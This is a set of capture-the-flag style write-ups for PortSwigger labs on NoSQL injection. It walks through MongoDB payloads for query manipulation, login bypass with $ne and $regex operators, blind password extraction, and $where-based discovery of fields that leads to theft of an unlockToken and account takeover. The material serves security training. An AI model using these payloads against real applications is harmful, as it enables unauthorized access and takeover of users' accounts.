## Detecting NoSQL injection
[Detecting NoSQL injection](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection)

Write-up:

1. Website as a filtering feature, which accesses the following url:
   https://0aee005103709b8ae2a908f1003f00c8.web-security-academy.net/filter?category=Accessories

2. By inserting an url encoded `'||'1'=='1`, we get the following url and respective MongoDB query, which solve the lab:
   https://0aee005103709b8ae2a908f1003f00c8.web-security-academy.net/filter?category=Accessories%27%7c%7c%27%31%27%3d%3d%27%31
   `this.category == 'Accessories'||'1'=='1'`

## Exploiting NoSQL operator injection to bypass authentication
[NoSQL injection to bypass authentication](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication)

Write-up:

1. We are told to login as `administrator` user, and we are given wiener:peter as valid credentials
   
2. If we use the following payloads, we get logged in as the valid user:
	`{"username":"wiener","password":{"$ne":""}}`
	`{"username":{"$ne":""},"password":"peter"}`

3.  The following payload logs us in as admin: as we don't know admin username:
	`{"username":{"$regex":"admin.*"},"password":{"$ne":""}}`
	Response:
	Location: /my-account?id=admink0gqh00s

## Exploiting syntax injection to extract data
[NoSQL injection to extract data](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data)

Files:
brute.py

Write-up:

1. When intercepting the correct login request, we find a GET /user/lookup?user=wiener.
   If we attempt to lookup user `administrator`, we see that it also exists.

2. Attempting to send user `administrator"` just returns non-existent user, but sending `administrator'` returns an error, which means we might be able to inject syntax here.
   
3. Our goal is to find the password, so we send:
   `administrator'%26%261=='1` - %26 being URL-encoded "&"
   This allows us to log in correctly. 

4. Now we brute-force the password:
   `administrator'%26%26password[0]=='a` - returns error
   `administrator'%26%26user.password[0]=='a` - returns error
   `administrator'%26%26this.password[0]=='a` - returns admin user, meaning that `password[0]=a` - note that equaling to "b" says non-existent user.

5. After brute-forcing with brute.py, we get password: ajjtacdz 

## Exploiting operator injection to extract unknown fields
[NoSQL injection to extract unknown fields](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields)

Files:
brute-operator.py
brute-operator-p2.py

Write-up:

1. We are told to log in as `carlos`, so we intercept a request with user `carlos`.
2. Sending `{"username":"carlos","password":{"$ne":"invalid"}}` returns "Account Locked", which means that we can't access the account, but the operator was successful.
3. Sending `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}` returns "invalid username or password", but sending `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "1"}` returns the same "Account Locked" as before, which means the $where operator is being evaluated.
4. Using `"$where": "Object.keys(this)[0].match('^.{0}.*')"` (0, 1, 2, 3, 4, etc.), we see there are 5 field names (0-4).
5. Using brute-operator.py, we can iterate through those indexes to brute-force their field names. We get:
   Discovered Fields: {0: '_id', 1: 'username', 2: 'password', 3: 'email', 4: 'unlockToken'}
6. Now that we know the field name, using brute-operator-p2.py we can find out "unlockToken". We get:
   Token: 99dac4b78c150b16
7. Going to /forgot-password, we insert username carlos and add `?unlockToken=99dac4b78c150b16`to url. This gets us to a password change screen, where we can change the password and login as carlos.